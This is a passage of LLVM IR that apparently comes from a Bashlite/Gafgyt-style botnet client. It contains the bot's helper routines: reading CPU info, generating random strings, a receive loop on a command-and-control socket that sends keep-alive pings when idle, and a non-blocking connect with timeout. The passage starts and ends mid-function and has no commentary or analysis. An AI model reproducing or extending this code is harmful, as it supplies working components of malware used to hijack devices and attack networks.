  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %62

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %27 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %28

; <label>:28:                                     ; preds = %42, %20
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %3, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = call i32 @waitpid(i32 %33, i32* %7, i32 0)
  store i32 %34, i32* %8, align 4
  br label %35

; <label>:35:                                     ; preds = %28
  %36 = load i32, i32* %8, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %42

; <label>:38:                                     ; preds = %35
  %39 = call i32* @__errno_location() #13
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 4
  br label %42

; <label>:42:                                     ; preds = %38, %35
  %43 = phi i1 [ false, %35 ], [ %41, %38 ]
  br i1 %43, label %28, label %44

; <label>:44:                                     ; preds = %42
  %45 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %46 = load i32*, i32** @fdopen_pids, align 8
  %47 = load i32, i32* %4, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 0, i32* %49, align 4
  %50 = load i32, i32* %8, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %44
  br label %60

; <label>:53:                                     ; preds = %44
  %54 = bitcast %struct.in_addr* %9 to i32*
  %55 = load i32, i32* %7, align 4
  store i32 %55, i32* %54, align 4
  %56 = bitcast %struct.in_addr* %9 to i32*
  %57 = load i32, i32* %56, align 4
  %58 = and i32 %57, 65280
  %59 = ashr i32 %58, 8
  br label %60

; <label>:60:                                     ; preds = %53, %52
  %61 = phi i32 [ -1, %52 ], [ %59, %53 ]
  store i32 %61, i32* %2, align 4
  br label %62

; <label>:62:                                     ; preds = %60, %19
  %63 = load i32, i32* %2, align 4
  ret i32 %63
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %8, align 4
  br label %9

; <label>:37:                                     ; preds = %25
  %38 = load i32, i32* %7, align 4
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %37
  br label %43

; <label>:41:                                     ; preds = %37
  %42 = load i8*, i8** %4, align 8
  br label %43

; <label>:43:                                     ; preds = %41, %40
  %44 = phi i8* [ null, %40 ], [ %42, %41 ]
  ret i8* %44
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %24

; <label>:14:                                     ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = or i64 %16, %22
  store i64 %23, i64* %3, align 8
  br label %4

; <label>:24:                                     ; preds = %12
  %25 = load i64, i64* %3, align 8
  ret i64 %25
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %54 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %37
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %76

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %33

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %31

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  br label %31

; <label>:31:                                     ; preds = %24, %19
  %32 = phi i1 [ false, %19 ], [ %30, %24 ]
  br label %33

; <label>:33:                                     ; preds = %31, %13
  %34 = phi i1 [ true, %13 ], [ %32, %31 ]
  %35 = xor i1 %34, true
  %36 = zext i1 %35 to i32
  store i32 %36, i32* %3, align 4
  br label %76

; <label>:37:                                     ; preds = %2
  %38 = load i8*, i8** %5, align 8
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %50

; <label>:42:                                     ; preds = %37
  %43 = load i8*, i8** %4, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8*, i8** %5, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = call i32 @wildString(i8* %44, i8* %46)
  %48 = icmp ne i32 %47, 0
  %49 = xor i1 %48, true
  br label %50

; <label>:50:                                     ; preds = %42, %37
  %51 = phi i1 [ false, %37 ], [ %49, %42 ]
  %52 = xor i1 %51, true
  %53 = zext i1 %52 to i32
  store i32 %53, i32* %3, align 4
  br label %76

; <label>:54:                                     ; preds = %2
  %55 = load i8*, i8** %4, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = call i32 @toupper(i32 %57) #10
  %59 = load i8*, i8** %5, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = call i32 @toupper(i32 %61) #10
  %63 = icmp eq i32 %58, %62
  br i1 %63, label %64, label %72

; <label>:64:                                     ; preds = %54
  %65 = load i8*, i8** %4, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = load i8*, i8** %5, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 1
  %69 = call i32 @wildString(i8* %66, i8* %68)
  %70 = icmp ne i32 %69, 0
  %71 = xor i1 %70, true
  br label %72

; <label>:72:                                     ; preds = %64, %54
  %73 = phi i1 [ false, %54 ], [ %71, %64 ]
  %74 = xor i1 %73, true
  %75 = zext i1 %74 to i32
  store i32 %75, i32* %3, align 4
  br label %76

; <label>:76:                                     ; preds = %72, %50, %33, %9
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

; <label>:7:                                      ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #10
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3

; <label>:16:                                     ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %82, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %84

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %16 = call i8* @strstr(i8* %15, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i32 0, i32 0)) #10
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %82

; <label>:19:                                     ; preds = %13
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %21 = getelementptr inbounds i8, i8* %20, i64 8
  store i8* %21, i8** %6, align 8
  br label %22

; <label>:22:                                     ; preds = %39, %19
  %23 = load i8*, i8** %6, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 32
  br i1 %26, label %37, label %27

; <label>:27:                                     ; preds = %22
  %28 = load i8*, i8** %6, align 8
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 9
  br i1 %31, label %37, label %32

; <label>:32:                                     ; preds = %27
  %33 = load i8*, i8** %6, align 8
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 58
  br label %37

; <label>:37:                                     ; preds = %32, %27, %22
  %38 = phi i1 [ true, %27 ], [ true, %22 ], [ %36, %32 ]
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %37
  %40 = load i8*, i8** %6, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %6, align 8
  br label %22

; <label>:42:                                     ; preds = %37
  br label %43

; <label>:43:                                     ; preds = %63, %42
  %44 = load i8*, i8** %6, align 8
  %45 = load i8*, i8** %6, align 8
  %46 = call i64 @strlen(i8* %45) #10
  %47 = sub i64 %46, 1
  %48 = getelementptr inbounds i8, i8* %44, i64 %47
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = icmp eq i32 %50, 13
  br i1 %51, label %61, label %52

; <label>:52:                                     ; preds = %43
  %53 = load i8*, i8** %6, align 8
  %54 = load i8*, i8** %6, align 8
  %55 = call i64 @strlen(i8* %54) #10
  %56 = sub i64 %55, 1
  %57 = getelementptr inbounds i8, i8* %53, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 10
  br label %61

; <label>:61:                                     ; preds = %52, %43
  %62 = phi i1 [ true, %43 ], [ %60, %52 ]
  br i1 %62, label %63, label %69

; <label>:63:                                     ; preds = %61
  %64 = load i8*, i8** %6, align 8
  %65 = load i8*, i8** %6, align 8
  %66 = call i64 @strlen(i8* %65) #10
  %67 = sub i64 %66, 1
  %68 = getelementptr inbounds i8, i8* %64, i64 %67
  store i8 0, i8* %68, align 1
  br label %43

; <label>:69:                                     ; preds = %61
  %70 = load i8*, i8** %6, align 8
  %71 = call i8* @strchr(i8* %70, i32 46) #10
  %72 = icmp ne i8* %71, null
  br i1 %72, label %73, label %76

; <label>:73:                                     ; preds = %69
  %74 = load i8*, i8** %6, align 8
  %75 = call i8* @strchr(i8* %74, i32 46) #10
  store i8 0, i8* %75, align 1
  br label %76

; <label>:76:                                     ; preds = %73, %69
  %77 = load i8*, i8** %3, align 8
  %78 = load i8*, i8** %6, align 8
  %79 = call i8* @strcpy(i8* %77, i8* %78) #2
  %80 = load i32, i32* %4, align 4
  %81 = call i32 @close(i32 %80)
  store i32 0, i32* %2, align 4
  br label %87

; <label>:82:                                     ; preds = %13
  %83 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %83, i8 0, i64 4096, i32 16, i1 false)
  br label %8

; <label>:84:                                     ; preds = %8
  %85 = load i32, i32* %4, align 4
  %86 = call i32 @close(i32 %85)
  store i32 1, i32* %2, align 4
  br label %87

; <label>:87:                                     ; preds = %84, %76
  %88 = load i32, i32* %2, align 4
  ret i32 %88
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

; <label>:5:                                      ; preds = %19, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %21

; <label>:10:                                     ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %13 = call i8* @strstr(i8* %12, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i32 0, i32 0)) #10
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %19

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* %1, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* %1, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %10
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %20, i8 0, i64 4096, i32 16, i1 false)
  br label %5

; <label>:21:                                     ; preds = %5
  %22 = load i32, i32* %2, align 4
  %23 = call i32 @close(i32 %22)
  %24 = load i32, i32* %1, align 4
  ret i32 %24
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6

; <label>:22:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  br i1 %48, label %49, label %88

; <label>:49:                                     ; preds = %33
  br label %50

; <label>:50:                                     ; preds = %83, %49
  %51 = load i32, i32* %13, align 4
  %52 = icmp slt i32 %51, 10
  br i1 %52, label %53, label %87

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* @mainCommSock, align 4
  %55 = call i32 (i32, i8*, ...) @sockprintf(i32 %54, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0))
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %56, align 8
  %57 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %57, align 8
  br label %58

; <label>:58:                                     ; preds = %53
  %59 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %60 = getelementptr inbounds [16 x i64], [16 x i64]* %59, i64 0, i64 0
  %61 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %60) #2, !srcloc !2
  %62 = extractvalue { i64, i64* } %61, 0
  %63 = extractvalue { i64, i64* } %61, 1
  %64 = trunc i64 %62 to i32
  store i32 %64, i32* %14, align 4
  %65 = ptrtoint i64* %63 to i64
  %66 = trunc i64 %65 to i32
  store i32 %66, i32* %15, align 4
  br label %67

; <label>:67:                                     ; preds = %58
  %68 = load i32, i32* %5, align 4
  %69 = srem i32 %68, 64
  %70 = zext i32 %69 to i64
  %71 = shl i64 1, %70
  %72 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %73 = load i32, i32* %5, align 4
  %74 = sdiv i32 %73, 64
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds [16 x i64], [16 x i64]* %72, i64 0, i64 %75
  %77 = load i64, i64* %76, align 8
  %78 = or i64 %77, %71
  store i64 %78, i64* %76, align 8
  %79 = load i32, i32* %5, align 4
  %80 = add nsw i32 %79, 1
  %81 = call i32 @select(i32 %80, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %81, i32* %12, align 4
  %82 = icmp sle i32 %81, 0
  br i1 %82, label %83, label %86

; <label>:83:                                     ; preds = %67
  %84 = load i32, i32* %13, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %13, align 4
  br label %50

; <label>:86:                                     ; preds = %67
  br label %87

; <label>:87:                                     ; preds = %86, %50
  br label %88

; <label>:88:                                     ; preds = %87, %33
  store i32 0, i32* %18, align 4
  %89 = load i8*, i8** %6, align 8
  store i8* %89, i8** %17, align 8
  br label %90

; <label>:90:                                     ; preds = %108, %88
  %91 = load i32, i32* %7, align 4
  %92 = add nsw i32 %91, -1
  store i32 %92, i32* %7, align 4
  %93 = icmp sgt i32 %91, 1
  br i1 %93, label %94, label %111

; <label>:94:                                     ; preds = %90
  %95 = load i32, i32* @mainCommSock, align 4
  %96 = call i64 @recv(i32 %95, i8* %16, i64 1, i32 0)
  %97 = icmp ne i64 %96, 1
  br i1 %97, label %98, label %100

; <label>:98:                                     ; preds = %94
  %99 = load i8*, i8** %17, align 8
  store i8 0, i8* %99, align 1
  store i32 -1, i32* %4, align 4
  br label %114

; <label>:100:                                    ; preds = %94
  %101 = load i8, i8* %16, align 1
  %102 = load i8*, i8** %17, align 8
  %103 = getelementptr inbounds i8, i8* %102, i32 1
  store i8* %103, i8** %17, align 8
  store i8 %101, i8* %102, align 1
  %104 = load i8, i8* %16, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp eq i32 %105, 10
  br i1 %106, label %107, label %108

; <label>:107:                                    ; preds = %100
  br label %111

; <label>:108:                                    ; preds = %100
  %109 = load i32, i32* %18, align 4
  %110 = add nsw i32 %109, 1
  store i32 %110, i32* %18, align 4
  br label %90

; <label>:111:                                    ; preds = %107, %90
  %112 = load i8*, i8** %17, align 8
  store i8 0, i8* %112, align 1
  %113 = load i32, i32* %18, align 4
  store i32 %113, i32* %4, align 4
  br label %114

; <label>:114:                                    ; preds = %111, %98
  %115 = load i32, i32* %4, align 4
  ret i32 %115
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %100

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
